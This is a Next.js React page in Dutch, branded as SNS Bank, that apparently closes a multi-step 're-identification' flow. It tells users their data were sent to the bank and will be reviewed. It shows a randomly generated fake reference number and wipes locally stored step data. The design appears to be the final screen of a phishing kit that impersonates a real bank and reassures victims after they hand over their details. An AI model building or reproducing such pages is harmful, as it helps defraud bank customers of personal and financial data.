"use client"

import { useEffect } from "react"
import { useRouter } from "next/navigation"
import { Button } from "@/components/ui/button"
import { Card, CardContent } from "@/components/ui/card"
import { CheckCircle, Home, Phone, Mail, Clock } from "lucide-react"

export default function Success() {
  const router = useRouter()

  useEffect(() => {
    // Clear any remaining data
    localStorage.removeItem("step1Data")
    localStorage.removeItem("step2Data")
    localStorage.removeItem("step3Data")
  }, [])

  return (
    <div className="min-h-screen bg-gradient-to-br from-green-50 to-white">
      {/* Header */}
      <header className="bg-white border-b border-gray-200 shadow-sm">
        <div className="max-w-4xl mx-auto px-4 py-6">
          <div className="flex items-center space-x-4">
            <div className="w-12 h-12 bg-gradient-to-br from-orange-500 to-orange-600 rounded-lg flex items-center justify-center">
              <span className="text-white font-bold text-lg">SNS</span>
            </div>
            <div>
              <h1 className="text-xl font-bold text-gray-900">SNS Bank</h1>
              <p className="text-green-600 text-sm">Re-identificatie voltooid</p>
            </div>
          </div>
        </div>
      </header>

      <main className="max-w-3xl mx-auto px-4 py-16">
        <Card className="shadow-xl border-0">
          <CardContent className="p-12 text-center">
            <div className="w-24 h-24 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-8">
              <CheckCircle className="h-12 w-12 text-green-600" />
            </div>

            <h1 className="text-4xl font-bold text-gray-900 mb-4">Re-identificatie voltooid!</h1>
            <p className="text-xl text-gray-600 mb-8 max-w-2xl mx-auto">
              Bedankt voor het voltooien van het re-identificatieproces. Uw gegevens zijn succesvol verzonden naar SNS
              Bank.
            </p>

            <div className="bg-green-50 border border-green-200 rounded-xl p-6 mb-8">
              <h3 className="text-lg font-semibold text-green-900 mb-4">Wat gebeurt er nu?</h3>
              <div className="space-y-3 text-left">
                <div className="flex items-start space-x-3">
                  <div className="w-6 h-6 bg-green-500 rounded-full flex items-center justify-center flex-shrink-0 mt-0.5">
                    <span className="text-white text-xs font-bold">1</span>
                  </div>
                  <p className="text-green-800">
                    Uw gegevens worden binnen 1 werkdag door onze specialisten beoordeeld
                  </p>
                </div>
                <div className="flex items-start space-x-3">
                  <div className="w-6 h-6 bg-green-500 rounded-full flex items-center justify-center flex-shrink-0 mt-0.5">
                    <span className="text-white text-xs font-bold">2</span>
                  </div>
                  <p className="text-green-800">U ontvangt binnen 2-3 werkdagen een bevestiging per e-mail</p>
                </div>
                <div className="flex items-start space-x-3">
                  <div className="w-6 h-6 bg-green-500 rounded-full flex items-center justify-center flex-shrink-0 mt-0.5">
                    <span className="text-white text-xs font-bold">3</span>
                  </div>
                  <p className="text-green-800">Uw bankzaken kunnen weer normaal worden gebruikt</p>
                </div>
              </div>
            </div>

            <div className="grid md:grid-cols-3 gap-6 mb-8">
              <div className="bg-blue-50 border border-blue-200 rounded-lg p-4">
                <Clock className="h-8 w-8 text-blue-600 mx-auto mb-3" />
                <h4 className="font-semibold text-blue-900 mb-2">Verwerkingstijd</h4>
                <p className="text-blue-800 text-sm">1-3 werkdagen</p>
              </div>
              <div className="bg-orange-50 border border-orange-200 rounded-lg p-4">
                <Mail className="h-8 w-8 text-orange-600 mx-auto mb-3" />
                <h4 className="font-semibold text-orange-900 mb-2">Bevestiging</h4>
                <p className="text-orange-800 text-sm">Per e-mail</p>
              </div>
              <div className="bg-green-50 border border-green-200 rounded-lg p-4">
                <CheckCircle className="h-8 w-8 text-green-600 mx-auto mb-3" />
                <h4 className="font-semibold text-green-900 mb-2">Status</h4>
                <p className="text-green-800 text-sm">Voltooid</p>
              </div>
            </div>

            <div className="flex flex-col sm:flex-row gap-4 justify-center">
              <Button
                onClick={() => router.push("/")}
                className="bg-gradient-to-r from-orange-500 to-orange-600 hover:from-orange-600 hover:to-orange-700 text-white px-8 py-3 rounded-lg font-semibold"
              >
                <Home className="h-5 w-5 mr-2" />
                Terug naar hoofdpagina
              </Button>
              <Button
                variant="outline"
                className="border-2 border-gray-300 hover:border-orange-500 text-gray-700 hover:text-orange-600 px-8 py-3 rounded-lg font-semibold bg-transparent"
                onClick={() => window.open("tel:030-291-29-12")}
              >
                <Phone className="h-5 w-5 mr-2" />
                Contact opnemen
              </Button>
            </div>

            <div className="mt-8 p-4 bg-gray-50 rounded-lg border border-gray-200">
              <p className="text-sm text-gray-600">
                <strong>Referentienummer:</strong> {Math.random().toString(36).substr(2, 9).toUpperCase()}
              </p>
              <p className="text-xs text-gray-500 mt-2">
                Bewaar dit nummer voor eventuele vragen over uw re-identificatie
              </p>
            </div>
          </CardContent>
        </Card>
      </main>
    </div>
  )
}
